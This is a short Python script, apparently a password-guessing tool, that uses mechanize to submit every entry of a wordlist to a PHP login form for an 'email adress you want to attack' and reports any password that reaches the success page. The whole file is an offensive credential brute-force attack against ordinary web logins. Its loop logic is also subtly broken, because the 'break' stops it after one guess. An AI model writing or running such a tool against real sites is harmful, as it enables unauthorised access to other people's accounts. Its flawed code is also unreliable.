import mechanize
b = mechanize.Browser()

url = input ("Enter Url to PHP Login: ")
success_url = input ("Enter the index link of the target website: ")
passwfile = input("Enter the Wordlist Path: ")
try:    
    passwfile = open(passwfile, "r")
except:
    print ("Wordlist not found!")
    print (passwfile)

username_input = input ("Enter Username ID Code <search in Inspect Element: ")
password_input = input ("Enter Password ID Code <search in Inspect Element: ")

username = input("Enter email adress you want to attack: ")
	
for password in passwfile:
    response = b.open(url)
    b.select_form(nr=0)  

    b.form[username_input] = username
    b.form[password_input] = password.strip()
    b.method = "POST"
    response = b.submit()
	
    if response.geturl() == success_url:
	    print ("[+]Password Found: " + password.strip())
    break
